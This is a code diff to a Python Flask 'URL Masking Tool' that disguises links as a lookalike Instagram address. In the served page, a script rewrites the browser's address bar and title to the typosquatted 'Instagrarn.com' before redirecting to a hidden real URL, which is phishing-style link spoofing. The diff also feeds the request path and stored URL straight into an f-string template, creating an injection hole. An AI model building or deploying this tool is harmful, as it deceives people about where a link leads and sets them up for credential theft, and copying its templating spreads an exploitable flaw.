@@ -40,7 +40,7 @@ def display_banner():
           ██║   ██║██╔██╗ ██║██║  ██║██║     ██║  ███╗█████╗  ██████╔╝
           ██║   ██║██║╚██╗██║██║  ██║██║     ██║   ██║██╔══╝  ██╔══██╗
           ╚██████╔╝██║ ╚████║██████╔╝███████╗╚██████╔╝███████╗██║  ██║
-           ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
+           ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
 
             URL Masking Tool (Version 3.0)
           Created by [Your Name Here]
@@ -75,20 +75,25 @@ def mask_url(public_url):
 
     url_mapping[random_path] = original_url
 
-    print(f"\n\033[92m[+]\033[0m Your Public Masked URL: \033[96m{fake_url}\033[0m")
+    print(f"\n\033[92m[+]\033[0m Your Public Masked URL: \033[96m{fake_url}?path={random_path}\033[0m")
     print(f"\033[92m[+]\033[0m Note: The actual URL is: \033[96m{masked_url}\033[0m (Do not share this)")
     input("\n\033[92m[+]\033[0m Press Enter to continue...")
 
 @app.route('/<path:random_path>')
 def fake_page(random_path):
     if random_path in url_mapping:
-        response = make_response(render_template_string('''
+        fake_url = "http://Instagrarn.com"  # You can dynamically set this based on your logic
+        response = make_response(render_template_string(f'''
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Loading...</title>
+    <title>{fake_url}</title>
+    <script>
+        window.history.replaceState(null, null, "{fake_url}?path={random_path}");
+        document.title = "{fake_url.split('//')[1].split('/')[0]}";
+    </script>
     <style>
-        body {
+        body {{
             font-family: Arial, sans-serif;
             background-color: white;
             margin: 0;
@@ -97,30 +102,26 @@ def fake_page(random_path):
             justify-content: center;
             align-items: center;
             height: 100vh;
-        }
-        .loader {
+        }}
+        .loader {{
             width: 40px;
             height: 40px;
             border: 4px solid rgba(0, 0, 0, 0.1);
             border-radius: 50%;
             border-top-color: #333;
             animation: spin 1s ease-in-out infinite;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        }}
+        @keyframes spin {{
+            to {{ transform: rotate(360deg); }}
+        }}
     </style>
-    <script>
-        window.history.replaceState({}, document.title, "http://Instagrarn.com");
-        document.title = "Instagram";
-    </script>
 </head>
 <body>
     <div class="loader"></div>
+    <meta http-equiv="refresh" content="2; url={url_mapping[random_path]}">
 </body>
 </html>
 '''))
-        response.headers['Refresh'] = f'2; url={url_mapping[random_path]}'
         return response
     return "URL not found or expired.", 404
 
